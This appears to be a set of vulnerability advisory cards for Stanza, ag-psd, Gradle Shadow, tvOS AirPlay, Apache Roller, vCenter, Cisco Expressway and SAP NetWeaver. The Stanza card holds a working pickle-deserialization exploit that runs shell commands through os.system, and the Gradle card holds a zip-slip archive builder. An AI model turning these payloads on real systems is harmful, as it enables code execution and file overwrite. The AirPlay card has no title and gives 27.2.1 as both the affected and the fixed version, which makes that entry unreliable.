Title: [PIP] Stanza: RCE via pickle deserialization in the lemmatizer

card.mechanism: The lemmatizer in Stanza versions 1.14.0 and later stores the `pos_dict` as a gzip-compressed pickle in the checkpoint's `dicts` field. When loading a checkpoint, the `Trainer.load` function uses an unrestricted `pickle.loads` to deserialize the data, allowing an attacker to execute arbitrary code by supplying a maliciously crafted `.pt` file.
card.impact: An attacker can achieve remote code execution (RCE) by providing a malicious lemmatizer checkpoint file. This affects Stanza version 1.14.0 and later when used with PyTorch 2.13.0 and CPython 3.13.7.
testing_syntax:
import gzip, io, os, pickle, tempfile, torch
from stanza.models.lemma.trainer import _unpack_pos_dict, _DICTS_VERSION_POS

MARKER = os.path.join(tempfile.gettempdir(), "stanza_lemma_poc_pwned")

class Payload:
    def __reduce__(self):
        return (os.system, ("id > %s 2>&1; echo executed_by=$(whoami) >> %s" % (MARKER, MARKER),))

buf = io.BytesIO()
with gzip.GzipFile(fileobj=buf, mode="wb") as gz:        # same shape as _pack_pos_dict()
    gz.write(pickle.dumps(Payload(), protocol=4))

ckpt = {"dicts": buf.getvalue(), "dicts_version": _DICTS_VERSION_POS}
pt = os.path.join(tempfile.gettempdir(), "evil_lemma.pt")
torch.save(ckpt, pt, _use_new_zipfile_serialization=False)

loaded = torch.load(pt, lambda s, l: s, weights_only=True)   # SUCCEEDS; dicts is bytes, intact
_unpack_pos_dict(loaded["dicts"])                            # == trainer.py:378 -> command runs
print("pwned:", open(MARKER).read().strip())
card.remediation: To mitigate this vulnerability, use the `RestrictedUnpickler` from `stanza/models/common/doc.py` to deserialize the inner stream, which allowlists only `tuple`, `list`, and `dict`. This ensures that only legitimate `pos_dict` structures are loaded.

Title: [NPM] ag-psd can exhaust memory when parsing crafted PSD dimensions

card.mechanism: The readPsd() function in ag-psd allocates memory based on the declared header dimensions of a PSD file before validating the actual data, allowing a small crafted PSD file to trigger a large memory allocation.
card.impact: An attacker can cause a remote Denial of Service (DoS) by sending a small, crafted PSD file that forces the application to allocate a large amount of memory, leading to an out-of-memory (OOM) condition and process termination. This affects ag-psd version 30.2.0.
card.remediation: Validate the declared dimensions, channel count, depth, and per-layer rectangles against the actual input length and a sane maximum before allocating memory.

Title: [MAVEN] Gradle Shadow: Zip Slip path traversal in ShadowCopyAction — no independent entry-name sanitization

card.impact: This vulnerability can lead to arbitrary file overwrite on any system that extracts the shadow JAR using unprotected extraction methods. Users on Gradle versions < 7.6.2 / 8.x < 8.2.0 are directly vulnerable at build time.
testing_syntax:
import zipfile
with zipfile.ZipFile('evil.jar', 'w') as zf:
    zf.writestr('../../../../tmp/zipslip_proof.txt', 'pwned')
card.remediation: Upgrade to Gradle 7.6.2 or 8.2.0 and ensure that any downstream consumers of the shadow JAR use protected extraction methods to mitigate the risk.

card.mechanism: The AirPlay vulnerability in tvOS 27.2.1 allows an attacker within Bluetooth range to bypass the rate limit on pairing code attempts. This is due to a logic issue that was addressed with improved state management.
card.impact: An attacker within Bluetooth range can bypass the rate limit on pairing code attempts, affecting Apple TV 4K 2nd generation and later.
card.remediation: Update to tvOS 27.2.1 to address the logic issue and improve state management.

Title: CVE-2026-129448 - Apache Roller Deserialization of Untrusted Data Vulnerability

card.mechanism: Apache Roller contains a deserialization of untrusted data vulnerability that allows an unauthenticated remote attacker to execute arbitrary code via the XML-RPC endpoint.
card.impact: An attacker can execute arbitrary code on affected versions of Apache Roller, leading to remote code execution.
card.remediation: Apply mitigations in accordance with vendor instructions and follow CISA’s BOD 26-04 guidance for prioritizing security updates based on risk. Discontinue use of the product if mitigations are unavailable.

Title: CVE-2026-123890 - VMWare vCenter Authentication Bypass Using an Alternate Path or Channel Vulnerability

card.mechanism: The vulnerability in Broadcom VMware vCenter allows an unauthenticated attacker to bypass authentication through an alternate path or channel in the VMware Directory Service.
card.impact: An attacker can gain unauthorized access to the vCenter system, potentially leading to further exploitation. This affects all versions of VMware vCenter.
card.remediation: Apply the mitigations provided by the vendor and follow CISA’s BOD 26-04 guidance for prioritizing security updates. Ensure compliance with CISA’s ‘Forensics Triage Requirements’.

Title: CVE-2026-76466 - Cisco Expressway Series Use of Hard-coded Credentials Vulnerability

card.mechanism: The Cisco Expressway Series contains a hard-coded credentials vulnerability that allows an unauthenticated, remote attacker to execute commands as root on a clustered device via the database service.
card.impact: An attacker can gain root access to the device, enabling them to execute commands with the highest privileges. This affects all versions of the Cisco Expressway Series.
card.remediation: Apply the mitigations provided by Cisco in accordance with CISA’s BOD 26-04 guidance. If mitigations are unavailable, discontinue use of the product.

Title: CVE-2025-42884 - SAP NetWeaver Improper Neutralization of Special Elements in Data Query Logic Vulnerability

card.mechanism: The vulnerability in SAP NetWeaver Enterprise Portal allows an unauthenticated attacker to inject JNDI environment properties or a URL used during JNDI lookup operations, leading to improper neutralization of special elements in data query logic.
card.impact: An attacker can exploit this vulnerability to disclose or modify server information. All versions of SAP NetWeaver Enterprise Portal are affected.
card.remediation: Apply the mitigations provided by SAP in accordance with CISA’s BOD 26-04 guidance. Ensure compliance with CISA’s ‘Forensics Triage Requirements’ and patching guidelines.
